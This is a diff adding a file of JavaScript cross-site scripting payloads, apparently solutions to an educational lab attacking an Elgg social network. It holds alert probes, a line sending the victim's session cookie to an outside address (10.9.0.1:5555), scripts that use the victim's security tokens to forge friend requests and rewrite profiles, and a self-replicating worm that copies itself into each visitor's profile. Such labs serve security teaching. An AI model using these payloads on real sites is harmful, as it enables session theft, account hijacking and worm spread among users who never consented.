@@ -1,0 +1,91 @@
+<script>alert("XSS");</script>
+<script>alert(document.cookie);</script>
+<script>document.write("<img src=http://10.9.0.1:5555?c=" + escape(document.cookie) + " >");</script>
+
+<script type="text/javascript">
+    window.onload = function () {
+        var Ajax = null;
+        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+        //Construct the HTTP request to add Samy as a friend.
+        var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token
+            + ts + token; //FILL IN
+        //Create and send Ajax request to add friend
+        Ajax = new XMLHttpRequest();
+        Ajax.open("GET", sendurl, true);
+        Ajax.send();
+    }
+</script>
+
+<script type="text/javascript">
+    window.onload = function () {
+        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+        //and Security Token __elgg_token
+        var userName = "&name=" + elgg.session.user.name;
+        var guid = "&guid=" + elgg.session.user.guid;
+        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+        //Construct the content of your url.
+        var aboutme = "Samy is my hero";
+        var content = `${token}${ts}${userName}&description=<p>${aboutme}</p>&accesslevel[description]=2&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=${guid}`; //FILL IN
+        var samyGuid = 59; //FILL IN
+        var sendurl = "http://www.seed-server.com/action/profile/edit"; //FILL IN
+        if (elgg.session.user.guid != samyGuid) {
+            //Create and send Ajax request to modify profile
+            var Ajax = null;
+            Ajax = new XMLHttpRequest();
+            Ajax.open("POST", sendurl, true);
+            Ajax.setRequestHeader("Content-Type",
+                "application/x-www-form-urlencoded");
+            Ajax.send(content);
+        }
+    }
+</script>
+
+
+<script type="text/javascript" id="worm">
+    window.onload = function () {
+        // 1. add friend
+        var Ajax = null;
+        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+        //Construct the HTTP request to add Samy as a friend.
+        var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token
+            + ts + token; //FILL IN
+        //Create and send Ajax request to add friend
+        Ajax = new XMLHttpRequest();
+        Ajax.open("GET", sendurl, true);
+        Ajax.send();
+
+        // 2. modify about me
+        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+        //and Security Token __elgg_token
+        var userName = "&name=" + elgg.session.user.name;
+        var guid = "&guid=" + elgg.session.user.guid;
+        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+        //Construct the content of your url.
+
+        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+        var jsCode = document.getElementById("worm").innerHTML;
+        var tailTag = "</" + "script>";
+        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+        var aboutMeText = "<p>Samy is my hero</p>";
+        var aboutMe = aboutMeText + wormCode;
+
+        var content =
+            `${token}${ts}${userName}&description=${aboutMe}&accesslevel[description]=2&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=${guid}`;
+        //FILL IN
+        var samyGuid = 59; //FILL IN
+        var sendurl = "http://www.seed-server.com/action/profile/edit"; //FILL IN
+        if (elgg.session.user.guid != samyGuid) {
+            //Create and send Ajax request to modify profile
+            var Ajax = null;
+            Ajax = new XMLHttpRequest();
+            Ajax.open("POST", sendurl, true);
+            Ajax.setRequestHeader("Content-Type",
+                "application/x-www-form-urlencoded");
+            Ajax.send(content);
+        }
+    }
+</script>
